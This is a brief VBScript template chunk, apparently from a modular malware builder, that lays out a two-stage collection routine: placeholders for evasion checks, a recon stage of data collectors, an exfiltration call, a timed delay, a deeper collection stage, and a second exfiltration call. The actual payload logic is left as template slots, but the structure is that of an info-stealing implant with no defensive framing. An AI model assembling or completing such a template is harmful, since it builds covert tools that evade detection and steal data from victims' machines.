' chunk: arch/staged
' depends: core/emit_buffer, core/run_cmd, core/file_ops
' provides: main
' format: vbscript

{{EVASION_CHECKS}}

emit "=== STAGE 1: RECON ===" & vbCrLf
{{STAGE1_COLLECTORS}}

{{EXFIL_CALL}}

WScript.Sleep {{STAGE2_DELAY}}

_buf = ""
emit "=== STAGE 2: DEEP ===" & vbCrLf
{{STAGE2_COLLECTORS}}

{{EXFIL_CALL}}
